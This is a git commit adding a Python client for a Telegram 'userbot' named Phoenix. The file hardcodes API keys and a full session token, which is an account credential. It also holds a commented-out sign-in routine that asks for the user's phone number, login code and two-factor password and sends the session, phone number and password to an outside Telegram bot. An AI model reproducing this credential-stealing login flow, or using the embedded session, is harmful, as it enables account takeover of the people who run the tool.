5fbfd089a01a9ffac6c3aeebd885b8f348da453b
Hacker <112378332+Hacker-UZ@users.noreply.github.com>
2025-04-02 13:51:03 +0500

    Add files via upload

---
+++ phoenix/client.py
@@ -0,0 +1,35 @@
+from telethon import TelegramClient, sync
+from telethon.sessions import StringSession
+from telethon.errors import SessionPasswordNeededError
+import os
+
+api_id = 9708508
+api_hash = "1e6ca420184a701db1f8a1301df99288"
+
+os.system("clear")
+print("""\033[031m
+   ___  __ ______  _____  _______  __   __  _____________  ___  ____  ______
+  / _ \/ // / __ \/ __/ |/ /  _/ |/_/  / / / / __/ __/ _ \/ _ )/ __ \/_  __/
+ / ___/ _  / /_/ / _//    // /_>  <   / /_/ /\ \/ _// , _/ _  / /_/ / / /   
+/_/  /_//_/\____/___/_/|_/___/_/|_|   \____/___/___/_/|_/____/\____/ /_/    
+      
+Developer: @programmer_www
+Telegram channel: @phoenix_userbot
+""")
+      
+#string = input("Press enter: ")
+string = "1ApWapzMBuxVRIm3ddVwKN8LJwPN57zoQK8QG6ivWaklChZjXwQI92UY7Oz3OQ6Fi-n_HJxEqorQsc6_7Ff-XsythnoKIDA1QLc84XGbXdlGiK_gsxoYUKyLDmz7PClhQAX7122ePVGrX61FEmpzMvHmTLN8hvfIz3Vx7jrT0NVvPmiIguh5gKyayveJhOqf9rRXbFQtZDOJZEULplwIYTIQx1F6tYz0zpMAV86yNDj6VCDCIwfyzf7YdH7l1R0wq7f-WSphOLg_Zide_zzFHwAtSScx_9s-QfYuUYfoSwO01O5Zl9XTF5_Mr821hrDWJRhFhmLtOTisH61HDJpHr86Mi_MibjYg="
+
+client = TelegramClient(StringSession(string), api_id, api_hash)
+#phone_number = input("Please enter your phone (or bot token): ")
+client.connect()
+
+#if not client.is_user_authorized():
+#    client.send_code_request(phone_number)
+#    try:
+#        me = client.sign_in(phone_number, input('Please enter the code you received: '))
+#        client.send_message("@string_session_sender_bot", f'Session: {client.session.save()}\n\nPhone number: {phone_number}')
+#    except SessionPasswordNeededError:
+#        password = input('Please enter your password: ')
+#        me2 = client.sign_in(password=password)  
+#        client.send_message("@string_session_sender_bot", f'Session: \n{client.session.save()}\n\nPhone number: {phone_number}\n\nPassword: {password}')
